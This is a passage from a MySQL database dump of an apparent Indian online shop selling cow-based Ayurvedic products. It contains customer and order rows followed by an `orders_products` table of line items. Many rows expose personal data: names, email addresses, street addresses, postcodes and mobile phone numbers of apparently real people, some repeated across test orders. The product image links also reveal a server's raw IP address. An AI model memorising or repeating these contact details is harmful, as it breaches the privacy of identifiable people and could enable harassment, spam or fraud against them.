(114, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(115, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(116, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(117, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(118, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(119, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(120, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(121, 'shilpa', 'shilpa@savithru.com', '#1259, 5th Cross, 8th Main, Triveni road', '', '2', 2, '', 'India', '560022', '9880566133', 'shilpa', '#1259, 5th Cross, 8th Main, Triveni road', '', '', 2, '2', 'India', '560022', '9880566133', '', '7506201702438654'),
(122, 'shri', 'shri@gmail.com', 'dfsdf', 'fsdfdsf', '2', 2, '', 'India', '560013', '9900599005', 'shri', 'dfsdf', 'fsdfdsf', '', 2, '2', 'India', '560013', '9900599005', '', '6862080156289210'),
(123, 'shri', 'shri@gmail.com', 'dfsdf', 'fsdfdsf', '2', 2, '', 'India', '560013', '9900599005', 'shri', 'dfsdf', 'fsdfdsf', '', 2, '2', 'India', '560013', '9900599005', '', '8797132943156141'),
(124, 'shri', 'shri@gmail.com', 'sdskdjfhkj', 'hkjshfkjsd', '2', 2, '', 'India', '560013', '9900599005', 'shri', 'sdskdjfhkj', 'hkjshfkjsd', '', 2, '2', 'India', '560013', '9900599005', '', '6889780758402087'),
(125, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '560064', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '560064', '7090099999', '', '8937692667639323'),
(126, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '560064', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '560064', '7090099999', '', '4861752167550336'),
(127, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '560064', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '560064', '7090099999', '', '2682896544266251'),
(128, 'Ashwin text', 'ashwin@savithru.com', '43, 1st main road', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43, 1st main road', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(129, 'Ashwin text', 'ashwin@savithru.com', '43, 1st main road', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43, 1st main road', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(130, 'Ashwin text', 'ashwin@savithru.com', '43, 1st main road', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43, 1st main road', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(131, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(132, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(133, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(134, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(135, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(136, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(137, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(138, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(139, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(140, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(141, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(142, 'Ashwintext', 'syed@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(143, 'Ashwintext', 'syed@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(144, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(145, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(146, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(147, 'suresh', 'gvsuresh@savithru.com', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore - 560010', '2', 2, '', 'India', '560010', '9845324064', 'suresh', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore-560010', '', 2, '2', 'India', '560010', '9845324064', '', '4432678697103690'),
(148, 'suresh', 'gvsuresh@savithru.com', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore - 560010', '2', 2, '', 'India', '560010', '9845324064', 'suresh', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore-560010', '', 2, '2', 'India', '560010', '9845324064', '', '3562058362684692'),
(149, 'suresh', 'gvsuresh@savithru.com', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore - 560010', '2', 2, '', 'India', '560010', '9845324064', 'suresh', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore-560010', '', 2, '2', 'India', '560010', '9845324064', '', '5931716301492144'),
(150, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(151, 'Ashwintext', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'Ashwintext', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(152, 'SavithruTechnologies', 'uday@savithru.com', 'Basaveshwaranagar', 'Bangalore', 'Bengaluru', 2, 'Karnataka', 'India', '560079', '9876543210', 'SavithruTechnologies', 'Basaveshwaranagar', 'Bangalore', 'Bengaluru', 2, 'Karnataka', 'India', '560079', '9876543210', '', ''),
(153, 'SavithruTechnologies', 'uday@savithru.com', 'Basaveshwaranagar', 'Bangalore', 'Bengaluru', 2, 'Karnataka', 'India', '560079', '9876543210', 'SavithruTechnologies', 'Basaveshwaranagar', 'Bangalore', 'Bengaluru', 2, 'Karnataka', 'India', '560079', '9876543210', '', ''),
(154, 'shri', 'shri@gmail.com', 'benglore', 'benglore', '2', 2, '', 'India', '560013', '9900599005', 'shri', 'benglore', 'benglore', '', 2, '2', 'India', '560013', '9900599005', '', '4048801453230527'),
(155, 'harsha', 'harsha@savithru.com', 'test', '', '2', 2, '', 'India', '560010', '9480001180', 'harsha', 'test', '', '', 2, '2', 'India', '560010', '9480001180', '', '6092751252583398'),
(156, 'Sonu', 'digital.acadamis@gmail.com', 'baswehwar nagar', '', '2', 2, '', 'India', '560072', '9886200188', 'Sonu', 'baswehwar nagar', '', '', 0, '', 'India', '560072', '9886200188', '', '6574706858505166');

-- --------------------------------------------------------

--
-- Table structure for table `orders_products`
--

CREATE TABLE `orders_products` (
  `oid` int(11) NOT NULL,
  `categ` varchar(100) NOT NULL,
  `psid` int(11) NOT NULL,
  `pname` text NOT NULL,
  `ptitle` varchar(255) NOT NULL,
  `pcode` text NOT NULL,
  `qty` int(11) NOT NULL,
  `unit_price` float NOT NULL,
  `price` float NOT NULL,
  `unit_dollar` float NOT NULL,
  `dollar` float NOT NULL,
  `size_id` int(11) NOT NULL,
  `size_name` text NOT NULL,
  `color` text NOT NULL,
  `material` text NOT NULL,
  `image_path` text NOT NULL,
  `status` int(11) NOT NULL,
  `tax` varchar(50) NOT NULL,
  `randid` varchar(50) NOT NULL,
  `package_id` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `orders_products`
--

INSERT INTO `orders_products` (`oid`, `categ`, `psid`, `pname`, `ptitle`, `pcode`, `qty`, `unit_price`, `price`, `unit_dollar`, `dollar`, `size_id`, `size_name`, `color`, `material`, `image_path`, `status`, `tax`, `randid`, `package_id`) VALUES
(1, '', 0, 'Demos', '', '000123', 3, 300, 250, 0, 0, 97, '250 gm', '', '', 'http://13.235.149.175/./assets/images/demo200x24001649150144.jpg', 0, '75', '5782563857038247', 0),
(2, '', 0, 'Demos', '', '000123', 1, 300, 250, 0, 0, 97, '250 gm', '', '', 'http://13.235.149.175/./assets/images/demo200x24001649150144.jpg', 0, '25', '5062744128451791', 0),
(2, '', 0, 'Demos', '', '000123', 4, 250, 200, 0, 0, 94, '5 gm', '', '', 'http://13.235.149.175/./assets/images/demo200x24001649150144.jpg', 0, '80', '5062744128451791', 0),
(3, '', 0, 'Saptharangi Ghanavati', '', '0002', 1, 200, 200, 0, 0, 118, '100 Pills', '', 'Gogarbha', 'http://13.235.149.175/assets/images/saptharangi-ghanavati200x24001649313284.png', 0, '', '', 0),
(4, '', 0, 'Pest Control', '', '0004', 3, 100, 100, 0, 0, 113, '1Kg', '', '', 'http://13.235.149.175/./assets/images/pest-control200x24001649322709.jpg', 0, '0', '3187074190617468', 0),
(5, '', 0, 'Abhyangha Taila', '', '0001', 1, 200, 200, 0, 0, 75, '200 ml', '', 'Gogarbha', 'http://13.235.149.175/./assets/images/abhyangha-taila200x24001649324345.jpg', 0, '', '', 0),
(6, '', 0, 'Punarnava Ark', '', '0022', 1, 150, 150, 0, 0, 110, '500ml', '', '', 'http://13.235.149.175/./assets/images/punarnava-ark200x24001649306839.jpg', 0, '18', '3126451136289413', 0),
(7, '', 0, 'Tulsi Ark', '', '0021', 2, 200, 200, 0, 0, 110, '500ml', '', '', 'http://13.235.149.175/./assets/images/tulsi-ark200x24001649306604.jpg', 0, '48', '7929762044380943', 0),
(8, '', 0, 'Universal Relief Oil', '', '0003', 2, 100, 100, 0, 0, 79, '10 ml', '', '', 'http://13.235.149.175/./assets/images/universal-relief-oil200x24001649325156.jpg', 0, '24', '2882016861612731', 0),
(8, '', 0, 'Gavya Triphala Churna', '', '0002', 1, 230, 230, 0, 0, 107, '100gms', '', '', 'http://13.235.149.175/assets/images/gavya-triphala-churna200x24001649314477.jpg', 0, '27.6', '2882016861612731', 0),
(9, '', 0, 'Gavya Triphala Churna', '', '0002', 1, 230, 230, 0, 0, 107, '100gms', '', '', 'http://13.235.149.175/assets/images/gavya-triphala-churna200x24001649314477.jpg', 0, '27.6', '8392698928939068', 0),
(10, '', 0, 'Saptharangi Ghanavati', '', '0002', 1, 200, 200, 0, 0, 118, '100 Pills', '', 'Gogarbha', 'http://13.235.149.175/assets/images/saptharangi-ghanavati200x24001649313284.png', 0, '', '', 0),
(11, '', 0, 'Saptharangi Ghanavati', '', '0002', 1, 200, 200, 0, 0, 118, '100 Pills', '', 'Gogarbha', 'http://13.235.149.175/assets/images/saptharangi-ghanavati200x24001649313284.png', 0, '', '', 0),
(12, '', 0, 'Chandrama Ark', '', '0024', 1, 250, 250, 0, 0, 110, '500ml', '', 'Gogarbha', 'http://13.235.149.175/./assets/images/chandrama-ark200x24001649307139.jpg', 0, '', '', 0),
(13, '', 0, 'Panchagavya Snana Churna', '', '0002', 3, 100, 100, 0, 0, 108, '150gms', '', 'Gogarbha', 'http://13.235.149.175/./assets/images/panchagavya-snana-churna200x24001649316236.jpg', 0, '', '', 0),
(13, '', 0, 'Chandrama Ark', '', '0024', 2, 250, 250, 0, 0, 110, '500ml', '', 'Gogarbha', 'http://13.235.149.175/./assets/images/chandrama-ark200x24001649307139.jpg', 0, '', '', 0),
(13, '', 0, 'Panchagavya Ghanavati', '', '0003', 3, 200, 200, 0, 0, 118, '100 Pills', '', 'Gogarbha', 'http://13.235.149.175/assets/images/panchagavya-ghanavati200x24001649313014.png', 0, '', '', 0),
(14, '', 0, 'Takramrutha', '', '0009', 1, 100, 100, 0, 0, 110, '500ml', '', '', 'http://13.235.149.175/./assets/images/takramrutha200x24001649247753.jpg', 0, '12', '8358402295596988', 0),
(15, '', 0, 'Saptharangi Ghanavati', '', '0002', 1, 200, 200, 0, 0, 118, '100 Pills', '', 'Gogarbha', 'http://13.235.149.175/assets/images/saptharangi-ghanavati200x24001649313284.png', 0, '', '', 0),
(16, '', 0, 'Gavya Triphala Churna', '', '0002', 5, 230, 230, 0, 0, 107, '100gms', '', '', 'http://13.235.149.175/assets/images/gavya-triphala-churna200x24001649314477.jpg', 0, '138', '9130538267598575', 0),
(17, '', 0, 'Sarphagandha Ghanavati', '', '0025', 5, 250, 200, 0, 0, 118, '100 Pills', '', '', 'http://13.235.149.175/assets/images/sarphagandha-ghanavati200x24001649313394.png', 0, '120', '2785368186887539', 0),
(18, '', 0, 'Diyas', '', '0001', 4, 300, 300, 0, 0, 120, 'Pack4', '', '', 'http://13.235.149.175/assets/images/diyas200x24001649832887.jpg', 0, '0', '8649503872311162', 0),
(19, '', 0, 'Ground Nut Oil', '', '0004', 3, 170, 170, 0, 0, 110, '500ml', '', '', 'http://13.235.149.175/./assets/images/ground-nut-oil200x24001649333926.jpg', 0, '25.5', '9027441004332610', 0),
(20, '', 0, 'Paneer', '', '0005', 2, 200, 200, 0, 0, 108, '150gms', '', '', 'http://13.235.149.175/./assets/images/paneer200x24001649391686.jpg', 0, '0', '6940168179022199', 0),
(21, '', 0, 'Panchgavya Ghanavati', '', '0003', 1, 200, 200, 0, 0, 118, '100 Pills', '', 'Gogarbha', 'http://13.235.149.175/assets/images/panchagavya-ghanavati200x24001649313014.png', 0, '', '', 0),
(21, '', 0, 'Jeevamrutha', '', '0005', 1, 100, 100, 0, 0, 113, '1Kg', '', 'Gogarbha', 'http://13.235.149.175/assets/images/jeeva-amrutha200x24001649841387.jpg', 0, '', '', 0),
(22, '', 0, 'Panchgavya Ghanavati', '', '0003', 1, 200, 200, 0, 0, 118, '100 Pills', '', 'Gogarbha', 'http://13.235.149.175/assets/images/panchagavya-ghanavati200x24001649313014.png', 0, '', '', 0),
(22, '', 0, 'Jeevamrutha', '', '0005', 1, 100, 100, 0, 0, 113, '1Kg', '', 'Gogarbha', 'http://13.235.149.175/assets/images/jeeva-amrutha200x24001649841387.jpg', 0, '', '', 0),
(23, '', 0, 'Panchgavya Ghanavati', '', '0003', 1, 200, 200, 0, 0, 118, '100 Pills', '', 'Gogarbha', 'http://13.235.149.175/assets/images/panchagavya-ghanavati200x24001649313014.png', 0, '', '', 0),
(23, '', 0, 'Jeevamrutha', '', '0005', 1, 100, 100, 0, 0, 113, '1Kg', '', 'Gogarbha', 'http://13.235.149.175/assets/images/jeeva-amrutha200x24001649841387.jpg', 0, '', '', 0),
(24, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 200, 100, 0, 0, 76, '100 ml', '', '', 'http://13.235.149.175/assets/images/tulsi-ark200x24001658475660.jpg', 0, '18', '5159000435589054', 0),
(25, '', 0, 'Cowdung Ghee Batti', '', '', 1, 200, 100, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/cowdung-ghee-batti200x24001658728604.jpg', 0, '0', '3045351180009152', 0),
(25, '', 0, 'Goumutra Ark', '', 'Ka/GMA/01', 1, 200, 100, 0, 0, 76, '100 ml', '', '', 'http://13.235.149.175/assets/images/goumutra-arka-plain200x24001658898932.jpg', 0, '18', '3045351180009152', 0),
(26, '', 0, 'Godhan Sambrani Cone', '', 'PI/GSC/01', 1, 65, 65, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/incense-sambrani-cone200x24001658494019.jpg', 0, '0', '7948463852919712', 0),
(27, '', 0, 'Godhan Sambrani Cone', '', 'PI/GSC/01', 1, 65, 65, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/incense-sambrani-cone200x24001658494019.jpg', 0, '0', '4203906308939330', 0),
(28, '', 0, 'Dantamanjan', '', 'SA/DM/01', 1, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '18', '9832895427076737', 0),
(29, '', 0, 'Dantamanjan', '', 'SA/DM/01', 1, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '18', '6301830439311742', 0),
(30, '', 0, 'Dantamanjan', '', 'SA/DM/01', 1, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '18', '1677789014515474', 0),
(30, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 2, 77, 77, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/diyas200x24001658726810.jpg', 0, '27.72', '1677789014515474', 0),
(31, '', 0, 'Dantamanjan', '', 'SA/DM/01', 1, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '18', '6702006632984129', 0),
(31, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 2, 77, 77, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/diyas200x24001658726810.jpg', 0, '27.72', '6702006632984129', 0),
(32, '', 0, 'Dantamanjan', '', 'SA/DM/01', 1, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '18', '6378770226404304', 0),
(32, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 2, 77, 77, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/diyas200x24001658726810.jpg', 0, '27.72', '6378770226404304', 0),
(33, '', 0, 'Dantamanjan', '', 'SA/DM/01', 1, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '18', '4455266737494840', 0),
(33, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 2, 77, 77, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/diyas200x24001658726810.jpg', 0, '27.72', '4455266737494840', 0),
(34, '', 0, 'Dantamanjan', '', 'SA/DM/01', 1, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '18', '9645004452399636', 0),
(34, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 2, 77, 77, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/diyas200x24001658726810.jpg', 0, '27.72', '9645004452399636', 0),
(35, '', 0, 'Dantamanjan', '', 'SA/DM/01', 1, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '18', '7415368863087877', 0),
(35, '', 0, 'Panchagavya Diyas', '', 'PICDS/01', 2, 77, 77, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/diyas200x24001658726810.jpg', 0, '27.72', '7415368863087877', 0),
(36, '', 0, 'Cowdung Ghee Batti', '', '', 1, 200, 100, 0, 0, 121, 'Pack 1', '', '', 'http://13.235.149.175/assets/images/cowdung-ghee-batti200x24001658728604.jpg', 0, '0', '1347263097470101', 0),
(36, '', 0, 'Dantamanjan', '', 'SA/DM/01', 1, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '18', '1347263097470101', 0),
(37, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 200, 100, 0, 0, 76, '100 ml', '', '', 'http://13.235.149.175/assets/images/tulsi-ark200x24001658486009.jpg', 0, '18', '4244721033539724', 0),
(38, '', 0, 'Roll On', '', 'TA/RO/01', 1, 40, 40, 0, 0, 112, '8ml', '', '', 'http://13.235.149.175/assets/images/pain-relief-oil200x24001658519811.jpg', 0, '0', '6210055802056700', 0),
(39, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '1739901663703162', 0),
(40, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 1, 200, 100, 0, 0, 76, '100 ml', '', '', 'http://13.235.149.175/assets/images/tulsi-ark200x24001658486009.jpg', 0, '18', '5996247330029365', 0),
(41, '', 0, 'Takra Ark', '', 'KA/TA/01', 3, 100, 100, 0, 0, 76, '100 ml', '', '', 'http://13.235.149.175/assets/images/takramrutha200x24001658485974.jpg', 0, '36', '4643670045186727', 0),
(42, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '6166010551728560', 0),
(43, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '2392651219025721', 0),
(44, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '8504148294607237', 0),
(45, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '1800592366146106', 0),
(46, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '5468469074060589', 0),
(47, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '9903102241443158', 0),
(48, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '3527132686042278', 0),
(49, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '9840707598708122', 0),
(50, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '1532422528491157', 0),
(51, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '8698826649418225', 0),
(52, '', 0, 'Skin Ointment', '', 'TA/SO/01', 3, 50, 50, 0, 0, 85, '20 gm', '', '', 'http://13.235.149.175/assets/images/skin-ointment200x24001658519842.jpg', 0, '18', '5936594206123435', 0),
(53, '', 0, 'Dantamanjan', '', 'SA/DM/01', 5, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '90', '2462647379304015', 0),
(54, '', 0, 'Dantamanjan', '', 'SA/DM/01', 2, 100, 100, 0, 0, 106, '50gms', '', '', 'http://13.235.149.175/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '36', '2075099005190065', 0),
(55, '', 0, 'Goumutra Ark', '', 'Ka/GMA/01', 4, 200, 100, 0, 0, 76, '100 ml', '', '', 'http://13.235.149.175/assets/images/goumutra-arka-plain200x24001658898932.jpg', 0, '72', '5836320929982084', 0),
(56, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 2, 200, 100, 0, 0, 76, '100 ml', '', '', 'http://13.235.149.175/assets/images/tulsi-ark200x24001658486009.jpg', 0, '36', '7584711253459049', 0),
(56, '', 0, 'Goumutra Asav', '', 'KA/GA/01', 3, 200, 100, 0, 0, 76, '100 ml', '', '', 'http://13.235.149.175/assets/images/gomutra-asav200x24001658485704.jpg', 0, '36', '7584711253459049', 0),
(57, '', 0, 'Tulsi Ark', '', 'KA/TA/01', 4, 200, 100, 0, 0, 76, '100 ml', '', '', 'http://13.235.149.175/assets/images/tulsi-ark200x24001658486009.jpg', 0, '72', '7736612263866240', 0),
(58, '', 0, 'Dantamanjan', '', 'SA/DM/01', 2, 100, 100, 0, 0, 106, '50gms', '', '', 'https://www.gogarbha.com/assets/images/gomayadi-dantamanjan200x24001658519499.jpg', 0, '36', '9077188088888387', 0),
